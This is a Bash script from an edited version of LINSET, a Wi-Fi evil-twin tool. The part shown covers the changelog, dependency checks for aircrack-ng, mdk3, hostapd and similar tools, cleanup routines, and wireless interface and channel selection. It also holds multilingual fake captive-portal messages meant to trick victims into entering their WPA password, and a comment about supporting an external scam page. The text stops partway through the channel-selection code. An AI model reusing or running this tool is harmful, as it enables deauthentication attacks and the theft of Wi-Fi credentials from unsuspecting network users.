#!/bin/bash
#Linset Edited Version to support external Scama 
#Please Try to Run this on pc with no network to prevent auto update

########## Modo DEBUG ##########
##			      ##
        LINSET_DEBUG=0
##			      ##
################################


#################################################################
#                                                               #
# # -*- ENCODING: UTF-8 -*-                                     #
# Este script es software libre. Puede redistribuirlo y/o     #
# modificar-lo bajo los términos de la Licencia Pública General #
# de GNU según es publicada por la Free Software Foundation,    #
# bien de la versión 3 de dicha Licencia o bien (según su       #
# elección) de cualquier versión posterior.                     #
#                                                               #
# Si usted hace alguna modificación en esta aplicación,         #
# deberá siempre mencionar al autor original de la misma.       #
#                                                               #
# Autor:Script creado por vk496                                 #
#                                                               #
# Integra funciones de Airoscript-ng                            #
# Funcion Seleccion Objetivo de Handshaker                      #
# Intro tomada de ONO Netgear WPA2 Hack                         #
#                                                               #
# Un saludo                                                     # 
#                                                               #
#################################################################


########## 06-11-2013 LINSET 0.1
##
## #Fecha de Salida
##
########## 07-11-2013 LINSET 0.1b
## 
## #Cambiado el Fakeweb a Inglés
## #Añadida funcion para quitar el modo monitor al salir
## #Arreglado Bucle para no colapsar la pantalla con información
## #Colocada opción de seleccionar otra red
## #Eliminado mensaje sobrante de iwconfig
##
########## 10-11-2013 LINSET 0.2
##
## #Añadido Changelog
## #Reestructurado el codigo
## #Cambiada la posición de ventanas xterm
## #Eliminada creacion extra del archivo route
## #Movido pantalla de comprobacion de handshake a una ventana xterm
## #Añadido menu durante el ataque
## #Añadida comprobacion de dependencias
##
########## 22-11-2013 LINSET 0.3
##
## #Arreglado mensaje de Handshake (no se mostraba bien)
## #Añadida interface de routers Telefonica y Jazztel (Xavi y Zyxel)
## #Fix cuando se usaba canales especificos (exit inesperado)
## #Mejorado DEBUG (function_clear y HOLD)
## #Migración de airbase-ng a hostapd
## #Reestructurado mas codigo
## #Añadido header
## #Añadida funcion para eliminar interfaces en modo monitor sobrantes
##
########## 30-11-2013 LINSET 0.4
##
## #Agregado soporte a airbase-ng junto a hostapd
## #Capacidad para comprobar pass sin handshake (modo Airlin"
## #Arregladas problemas con variables
## #Fix espacio Channel
## #Eliminada seleccion con multiples tarjetas de red
## #Arreglado error sintactico HTML de las interfaces Xavi
## #Implementada interface Zyxel (de routers de Telefonica también)
##
########## 07-12-2013 LINSET 0.5
##
## #Arreglado bug que impide usar mas de una interface
## #Migración de iwconfig a airmon-ng
## #Añadida interface HomeStation (Telefonica)
## #Arregladas llamadas PHP a error2.html inexistente
## #Arreglado bug que entraba en seleccion de Objetivos sin que se haya creado el CSV correspondiente
## #Opcion Salir en el menu de seleccion de webinterfaces
## #Arreglado bug que entraba en seleccion de Clientes sin que los haya
## #Arreglado bug que entraba en seleccion de Canal sin que haya interface valida seleccionada
##
########## 11-12-2013 LINSET 0.6
##
## #Bug al realizar deauth especifico sin que haya airodump en marcha
## #Modificadas variables que gestionan los CSV
## #Modificada estetica a la hora de seleccionar objetivo
## #Añadidos colores a los menus
## #Modificado funcionamiento interno de seleccion de opciones
## #Arreglado bug de variables en la comprobacion de dependencias
## #Añadida dependencia para ser root
##
########## 15-12-2013 LINSET 0.7
##
## #Añadido intro
## #Mejoradas variables de colores
## #Añadida interface de los routers Compal Broadband Networks (ONOXXXX)
## #Mejorada la gestion de la variable de Host_ENC
## #Arreglado bug que entraba en modo de FakeAP elegiendo una opcion inexistente
## #Modificado nombre de HomeStation a ADB Broadband (según su MAC)
## #Agregada licencia GPL v3
##
########## 27-12-2013 LINSET 0.8
##
## #Modificada comprobación de permisos para mostrar todo antes de salir
## #Añadida funcion para matar software que use el puerto 80
## #Agregado dhcpd a los requisitos
## #Cambiado titulo de dependecia de PHP (php5-cgi)
## #Modificado parametro deauth para PC's sin el kernel parcheado
## #Añadida funcion para matar software que use el puerto 53
## #Funcion para remontar los drivers por si se estaba usando la interface wireless
## #Modificada pantalla que comprueba el handshake (mas info) y mejoradas las variables
## #Mejorado menu de comprobacion de password con mas información
## #Añadida lista de clientes que se muestran en el menu de comprobacion de password
## #Cambiado ruta de guardado de password al $HOME
## #Reestructuracion completa del codigo para mejor compresion/busqueda
## #El intro no aparecerá si estas en modo desarrollador
## #No se cerrará el escaneo cuando se compruebe el handshake
#
## #Agregada funcion faltante a la 0.8 inicial (me lo comi sin querer)
##
########## 03-01-2014 LINSET 0.9
##
## #Funcion de limpieza si se cierra el script inesperadamente
## #Mejorada funcion de deteccion del driver
## #Modificadas variables que almacenaban las interfaces con nombres "wlan" y 'mon' para dar mas soporte a otros sistemass
## #La carpeta de trabajo se crea mas temprano para evitar posibles problemas
## #Añadida funcion para comprobar la ultima revision de LINSET
## #Autoactualizacion del script si detecta una version mas nueva de si mismo
## #Backup del script tras la actualizacion por si surgen problemas
## #Fix Menu de tipo de Desautentificacion (no se ve lo que se escribe)
## #Eliminada funcion handshakecheck del background
## #Eliminado mensaje de clientes.txt (problema devido a handcheck)
## #Bug que no mostraba correctamente los clientes conectados
##
########## 19-01-2014 LINSET 0.10
##
## #Agregado curl a las dependencias
## #Bug que no mostraba bien la lista de los clientes
## #Eliminado cuadrado en movimiento por cada sleep que se hacia en la ventana de comprobacion de handshake
## #Mejorada la comunicacion entre PHP y checkhandshake (ya no funciona por tiempos)
## #Cambiada ruta de trabajo de LINSET por defecto
## #Bug wpa_passphrase y wpa_supplicant no se cerraban tras concluir el ataque
## #Suprimidas de forma indefinida todas las interfaces web hasta ahora por motivos de copyright
## #Integrada interface web neutra basada en JQM
##
########## 29-01-2014 LINSET 0.11
##
## #Mejorada la comprobacion de actualizaciones (punto de partida desde la version del script actual)
## #Modificada url de comprobacion
## #Bug mensaje de root privilegies (seguia con el proceso)
## #Modificado orden de inicio (primero comprueba las dependencias)
## #Mejorada interface web
## #Agregada dependencia unzip
## #Bug al seleccionar una interface que no existe
## #Fix variable $privacy
## #Modificaciones leves de interface web
## #Adaptada interface para multiples idiomas
## #Añadido idioma Español
## #Añadido idioma Italiano
##
########## 18-02-2014 LINSET 0.12
##
## #Tarjetas con chipset 8187 pasaran dietctamente al menu de airbase-ng
## #Mensaje javascript adaptado según el idioma
## #Fix variable revision del backup
## #Bug en busqueda infinita de actualizaciones
## #Añadida restauracion de tput a la limpieza del script
## #Cerrar aplicaciones por medio del PID para evitar problemas
## #Añadido mdk3 a dependencias
## #Añadida desautenticacion por mdk3 al AP
## #Organizacion de codigo
## #Mejorada la busqueda de actualizaciones (casi directa)
## #Cambiada ruta de guardado del backup
##
########## 21-03-2014 LINSET 0.13
##
## #Ampliado tiempo de espera antes de detener el atque
## #Corregido bug al hacer backup
## #Añadido reinicio de NetworkManager para Wifislax 4.8
## #Desautentificacion masiva se hace exclusivamente con mdk3
## #Fallo al reiniciar networkmanager cuando acaba el ataque
## #Fix cuando se autocierra linset despues de acabar el ataque
## #Añadido pyrit a dependecias
## #Funcion de comprobacion estricta del handshake
## #Eliminadas dependencias inecesarias
## #Mayor desplazamiento por los menus
## #Añadido lenguaje Frances
## #Añadido lenguaje Portugues
## 
##########
clear



##################################### < CONFIGURACION DEL SCRIPT > #####################################

# Ruta de almacenamiento de datos
DUMP_PATH="/tmp/TMPlinset"
# Numero de desautentificaciones
DEAUTHTIME="8"
# Numero de revision
revision=33
# Numero de version
version=0.13
# Rango de IP que se usaran en DHCP
IP=192.168.1.1
# Crea variable de de una red a partir del Gateway
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Colores
blanco="\033[1;37m"
gris="\033[0;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"
rescolor="\e[0m"


# Ajusta el Script en modo normal o desarrollador
if [ $LINSET_DEBUG = 1 ]; then
	## set to /dev/stdout when in developer/debugger mode
	export linset_output_device=/dev/stdout
	HOLD="-hold"
else
	## set to /dev/null when in production mode
	export linset_output_device=/dev/null
	HOLD=""
fi

# Hacer clears si el modo es normal
function conditional_clear() {
	
	if [[ "$linset_output_device" != "/dev/stdout" ]]; then clear; fi
}

# Calcula la ultima revision


# Animacion del spinner
function spinner {
	
	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}

# Si se recibe un error, mostrar la liena mientras estemos en modo DEBUG
if [ "$LINSET_DEBUG" = "1" ]; then
	trap 'err_report $LINENO' ERR
fi

# Comunica la liena donde se encuentra el error
function err_report {
	echo "Error en la linea $1"
}


# Si se cierra el script inesperadamente, ejecutar la funcion
trap exitmode SIGINT

# Funcion que limpia las interfaces y sale
function exitmode {
	
	echo -e "\n\n"$blanco"["$rojo" "$blanco"] "$rojo"Ejecutando la limpieza y cerrando."$rescolor""
	
	if ps -A | grep -q aireplay-ng; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"aireplay-ng"$rescolor""
		killall aireplay-ng &>$linset_output_device
	fi
	
	if ps -A | grep -q airodump-ng; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"airodump-ng"$rescolor""
		killall airodump-ng &>$linset_output_device
	fi
	
	if ps a | grep python| grep fakedns; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"python"$rescolor""
		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$linset_output_device
	fi
	
	if ps -A | grep -q hostapd; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"hostapd"$rescolor""
		killall hostapd &>$linset_output_device
	fi
	 
	if ps -A | grep -q lighttpd; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"lighttpd"$rescolor""
		killall lighttpd &>$linset_output_device
	fi
	 
	if ps -A | grep -q dhcpd; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"dhcpd"$rescolor""
		killall dhcpd &>$linset_output_device
	fi
	
	if ps -A | grep -q mdk3; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Matando "$gris"mdk3"$rescolor""
		killall mdk3 &>$linset_output_device
	fi
	
	if [ "$WIFI_MONITOR" != "" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Deteniendo interface "$verde"$WIFI_MONITOR"$rescolor""
		airmon-ng stop $WIFI_MONITOR &> $linset_output_device
	fi
	
	if [ "$WIFI" != "" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Deteniendo interface "$verde"$WIFI"$rescolor""
		airmon-ng stop $WIFI &> $linset_output_device
	fi
	
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Restaurando "$gris"ipforwarding"$rescolor""
		echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
	fi
	
	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Limpiando "$gris"iptables"$rescolor""
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	
	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Restaurando "$gris"tput"$rescolor""
	tput cnorm
	
	if [ $LINSET_DEBUG != 1 ]; then
		
		echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Eliminando "$gris"archivos"$rescolor""
		rm -R $DUMP_PATH/* &>$linset_output_device
	fi
	
	echo -e ""$blanco"["$rojo"-"$blanco"] "$blanco"Reiniciando "$gris"NetworkManager"$rescolor""
	service restart networkmanager &> $linset_output_device &
	
	echo -e ""$blanco"["$verde"+"$blanco"] "$verde"Limpiza efectuada con exito!"$rescolor""
	exit
	
}

# Genera listado de Interfaces en el Script
readarray -t webinterfaces < <(echo -e "Interface web neutra
\e[1;31mSalir"$rescolor""
)

# Genera listado de Idiomas web
readarray -t webinterfaceslenguage < <(echo -e "Engish [ENG]
Spanish[ESP]
\e[1;31mAtras"$rescolor""
)

#Mensajes de interfaces web Ingles
DIALOG_WEB_INFO_ENG="For security reasons, enter the <b>"$Host_ENC"</b> key to access the Internet"
DIALOG_WEB_INPUT_ENG="Enter your WPA password:"
DIALOG_WEB_SUBMIT_ENG="Submit"
DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" size=\"3\">Error</font>:</b> The entered password is <b>NOT</b> correct!</b>"
DIALOG_WEB_OK_ENG="Your connection will be restored in a few moments."
DIALOG_WEB_BACK_ENG="Back"
DIALOG_WEB_LENGHT_MIN_ENG="The password must be more than 7 characters"
DIALOG_WEB_LENGHT_MAX_ENG="The password must be less than 64 characters"

#Mensajes de interfaces web Español
DIALOG_WEB_INFO_ESP="Por razones de seguridad, introduzca la contrase&ntilde;a <b>"$Host_ENC"</b> para acceder a Internet"
DIALOG_WEB_INPUT_ESP="Introduzca su contrase&ntilde;a WPA:"
DIALOG_WEB_SUBMIT_ESP="Enviar"
DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b>"
DIALOG_WEB_OK_ESP="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
DIALOG_WEB_BACK_ESP="Atr&aacute;s"
DIALOG_WEB_LENGHT_MIN_ESP="La clave debe ser superior a 7 caracteres"
DIALOG_WEB_LENGHT_MAX_ESP="La clave debe ser inferior a 64 caracteres"

#Mensajes de interfaces web Italiano
DIALOG_WEB_INFO_IT="Per motivi di sicurezza, immettere la chiave <b>"$Host_ENC"</b> per accedere a Internet"
DIALOG_WEB_INPUT_IT="Inserisci la tua password WPA:"
DIALOG_WEB_SUBMIT_IT="Invia"
DIALOG_WEB_ERROR_IT="<b><font color=\"red\" size=\"3\">Errore</font>:</b> La password <b>NON</b> &egrave; corretta!</b>"
DIALOG_WEB_OK_IT="La connessione sar&agrave; ripristinata in pochi istanti."
DIALOG_WEB_BACK_IT="Indietro"
DIALOG_WEB_LENGHT_MIN_IT="La password deve essere superiore a 7 caratteri"
DIALOG_WEB_LENGHT_MAX_IT="La password deve essere inferiore a 64 caratteri"

#Mensajes de interfaces web Frances
DIALOG_WEB_INFO_FR="Pour des raisons de s&eacute;curit&eacute;, veuillez introduire <b>"$Host_ENC"</b> votre cl&eacute; pour acceder &agrave; Internet"
DIALOG_WEB_INPUT_FR="Entrez votre cl&eacute; WPA:"
DIALOG_WEB_SUBMIT_FR="Valider"
DIALOG_WEB_ERROR_FR="<b><font color=\"red\" size=\"3\">Error</font>:</b> La cl&eacute; que vous avez introduit <b>NOT</b> est incorrecte!</b>"
DIALOG_WEB_OK_FR="Veuillez patienter quelques instants."
DIALOG_WEB_BACK_FR="Pr&eacute;c&eacute;dent"
DIALOG_WEB_LENGHT_MIN_FR="La passe dois avoir plus de 7 digits"
DIALOG_WEB_LENGHT_MAX_FR="La passe dois avoir moins de 64 digits"

#Mensajes de interfaces web Portugues
DIALOG_WEB_INFO_POR="Por raz&#245;es de seguran&#231;a, digite a senha para acessar a Internet"
DIALOG_WEB_INPUT_POR="Digite sua senha WPA"
DIALOG_WEB_SUBMIT_POR="Enviar"
DIALOG_WEB_ERROR_POR="<b><font Color=\"red\" size=\"3\">Erro</font>:</b> A senha digitada <b>N&#195;O</b> est&#225; correto </b>!"
DIALOG_WEB_OK_POR="Sua conex&#227;o &#233; restaurada em breve."
DIALOG_WEB_BACK_POR="Voltar"
DIALOG_WEB_LENGHT_MIN_POR="A senha deve ter mais de 7 caracteres"
DIALOG_WEB_LENGHT_MAX_POR="A chave deve ser menor que 64 caracteres"

# Muestra el mensaje principal del script
function mostrarheader(){
	
	conditional_clear
	echo -e "$verde#########################################################"
	echo -e "$verde#                                                       #"
	echo -e "$verde#$rojo		 LINSET $version" "${amarillo}by ""${azul}vk496""$verde                   #"
	echo -e "$verde#""${rojo}	L""${amarillo}inset" "${rojo}I""${amarillo}s" "${rojo}N""${amarillo}ot a ""${rojo}S""${amarillo}ocial ""${rojo}E""${amarillo}nginering" "${rojo}T""${amarillo}ool""$verde          #"
	echo -e "$verde#                                                       #"
	echo -e "$verde#########################################################""$rescolor"
	echo
	echo
}

##################################### < CONFIGURACION DEL SCRIPT > #####################################






############################################## < INICIO > ##############################################


if ! [ $(id -u) = "0" ] 2>/dev/null; then
	echo -e "\e[1;31mYou don't have admin privilegies"$rescolor""
	exit
fi

# Comprueba la existencia de todas las dependencias
function checkdependences {
	
	echo -ne "Aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Awk............."
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor" (isc-dhcp-server)"
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Iwconfig........"
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Macchanger......"
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
	    echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Php5-cgi........"
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Pyrit..........."
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Python.........."
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Unzip..........."
	if ! hash unzip 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	echo -ne "Xterm..........."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$rescolor""
		salir=1
	else
		echo -e "\e[1;32mOK!"$rescolor""
	fi
	sleep 0.025
	
	if [ "$salir" = "1" ]; then
	exit 1
	fi
	
	sleep 1
	clear
}
mostrarheader
checkdependences

# Crear carpeta de trabajo
if [ ! -d $DUMP_PATH ]; then
	mkdir $DUMP_PATH &>$linset_output_device
fi

# Intro del script
if [ $LINSET_DEBUG != 1 ]; then
	
	echo "" 
	sleep 0.1 && echo -e $rojo "                      _    _ _   _  ____  _____ _______"                     
	sleep 0.1 && echo -e $rojo "                     | |  | | \ | |/ ___\/  ___|__   __|"                     
	sleep 0.1 && echo -e $rojo "                     | |  | |  \| | |___ | |___   | |"
	sleep 0.1 && echo -e $rojo "                     | |  | | .   |\___ \|  ___|  | |"
	sleep 0.1 && echo -e $rojo "                     | |__| | |\  |____| | |___   | |"
	sleep 0.1 && echo -e $rojo "                     |____|_|_| \_|\____/\_____|  |_|"
	sleep 0.1 && echo ""
	sleep 0.1 && echo ""
	sleep 0.1 && echo -e $amarillo "           _       ______  ___ "$blanco"   __"$amarillo" ___  "$verde"    __  __           __"
	sleep 0.1 && echo -e $amarillo "          | |     / / __ \/   |"$blanco"  / /"$amarillo"|__ \ "$verde"   / / / /___ ______/ /__"
	sleep 0.1 && echo -e $amarillo "          | | /| / / /_/ / /| |"$blanco" / /"$amarillo" __/ /"$verde"   / /_/ / __  / ___/ //_/"
	sleep 0.1 && echo -e $amarillo "          | |/ |/ / ____/ ___ |"$blanco"/ /"$amarillo" / __/ "$verde"  / __  / /_/ / /__/ ,<"
	sleep 0.1 && echo -e $amarillo "          |__/|__/_/   /_/  |_"$blanco"/_/"$amarillo" /____/ "$verde" /_/ /_/\__,_/\___/_/|_|" 
	sleep 0.1 && echo ""
	sleep 0.1 && echo ""
	sleep 1
	
	echo ""
	echo -e $rojo"                     LINSET EDITED Version "$blanco" "$amarillo"by "$blanco" fantome195"
	echo ""
	sleep 1
	echo -e $verde"                        Project "$rojo"https://github.com/fantome195/linset/ "$rescolor
	sleep 1

	

	spinner "$!"
	
	echo ""
	tput cnorm
	sleep 2
	
fi

# Mostrar info del AP seleccionado
function infoap {
	
	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
	echo "INFO AP OBJETIVO"
	echo
	echo -e "                     "$verde"SSID"$rescolor" = $Host_SSID / $Host_ENC"
	echo -e "                    "$verde"Canal"$rescolor" = $channel"
	echo -e "                "$verde"Velocidad"$rescolor" = ${speed:2} Mbps"
	echo -e "               "$verde"MAC del AP"$rescolor" = $mac (\e[1;33m$Host_MAC_MODEL"$rescolor")"
	echo
}

############################################## < INICIO > ##############################################






############################################### < MENU > ###############################################

# Se detecta la resolucion optima de nuestro equipo
function setresolution {

	function resA {
		# Upper left window +0+0 (size*size+position+position)
		TOPLEFT="-geometry 90x13+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 83x26-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 90x24+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}
	
	function resB {
		# Upper left window +0+0 (size*size+position+position)
		TOPLEFT="-geometry 92x14+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 68x25-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 92x36+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}
	function resC {
		# Upper left window +0+0 (size*size+position+position)
		TOPLEFT="-geometry 100x20+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 109x20-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 100x30+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}
	function resD {
		# Upper left window +0+0 (size*size+position+position)
		TOPLEFT="-geometry 110x35+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 99x40-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 110x35+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}
	function resE {
		# Upper left window +0+0 (size*size+position+position)
		TOPLEFT="-geometry 130x43+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 68x25-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}
	function resF {
		# Upper left window +0+0 (size*size+position+position)
		TOPLEFT="-geometry 100x17+0+0" # capturando datos de victima ...  ( VENTANA AIRODUMP ATAUQE )
		# Upper right window -0+0
		TOPRIGHT="-geometry 90x27-0+0" # desautenticando
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 100x30+0-0" # aireplay , CHOPCHOP , FRAGMENTACION... ( VENTANA BAJO CAPTURAS DE AIRODUMP )
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 90x20-0-0" # ASOCIANDO CON... ( VENTANA ROJA )
		TOPLEFTBIG="-geometry  100x70+0+0" # escaneando objetivos ... ( ESCANEO INICIAL )
		TOPRIGHTBIG="-geometry 90x27-0+0"  # AIRCRACK ... ( BUSQUEDA DE KEYS ) 
}

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"1280x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;; ## fallback a una opción segura
esac
}

# Escoge las interfaces a usar
function setinterface {
	
	# Coge todas las interfaces en modo monitor para detenerlas
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
	
	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$linset_output_device
		echo -n "$monkill, "
	done
	
	# Crea una variable con la lista interfaces de red fisicas
	readarray -t wirelessifaces < <(airmon-ng |grep "-" | awk '{print $1}')
	INTERFACESNUMBER=`airmon-ng| grep -c "-"`
	
	echo
	echo
	echo Autodetectando Resolución...
	echo $detectedresolution
	echo
	
	
	# Si solo hay 1 tarjeta wireless
	if [ "$INTERFACESNUMBER" -gt "0" ]; then
		
		echo "Selecciona una interface:"
		echo
		i=0
		
		for line in "${wirelessifaces[@]}"; do
			i=$(($i+1))
			wirelessifaces[$i]=$line
			echo -e "$verde""$i)"$rescolor" $line"
		done
		
		echo -n "#? "
		read line
		PREWIFI=${wirelessifaces[$line]}
		
		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			conditional_clear
			mostrarheader
			setinterface
		fi
		
		readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "on interface" | awk '{ print $2 }')
		WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$linset_output_device 2>&1
		
		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$linset_output_device
		done
		sleep 0.5
		
		modprobe "$WIFIDRIVER" &>$linset_output_device 2>&1
		sleep 0.5
		# Selecciona una interface
		select PREWIFI in $INTERFACES; do
			break;
		done
		
		WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "enabled on" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
		# Establece una variable para la interface fisica
		  WIFI=$PREWIFI
		# Cerrar si no detecta nada
	else
		
		echo No se han encontrado tarjetas Wireless. Cerrando...
		sleep 5
		exitmode
	fi
	
	vk496
	
}

# Intermediario que comprueba validez de la eleccion y prepara el entorno
function vk496 {
	
	conditional_clear
	CSVDB=dump-01.csv
	
	rm -rf $DUMP_PATH/*
	
	choosescan
	selection
}

# Elige si quieres escanear todos los canales o uno especifico
function choosescan {
	
	conditional_clear
	
	while true; do
		conditional_clear
		mostrarheader
		
		echo "SELECCIONA CANAL"
		echo "                                       "
		echo -e "      "$verde"1)"$rescolor" Todos los canales             "
		echo -e "      "$verde"2)"$rescolor" Canal(es) específico(s)       "
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) Scan ; break ;;
			2 ) Scanchan ; break ;;  
			* ) echo "Opción desconocida. Elige de nuevo"; conditional_clear ;;
		  esac
	done
}

# Elige que canal/es escanear si elegiste esa opcion
function Scanchan {
	  
	conditional_clear
	mostrarheader
	
	  echo "                                       "
	  echo "      Selecciona Canal de busqueda     "
	  echo "                                       "
	  echo -e "     Un solo canal     "$verde"6"$rescolor"               "
	  echo -e "     rango de canales  "$verde"1-5"$rescolor"             "
	  echo -e "     Multiples canales "$verde"1,2,5-7,11"$rescolor"      "
	  echo "                                       "
	echo -n "      #> "
	read channel_number
	set -- ${channel_number}
	conditional_clear
	
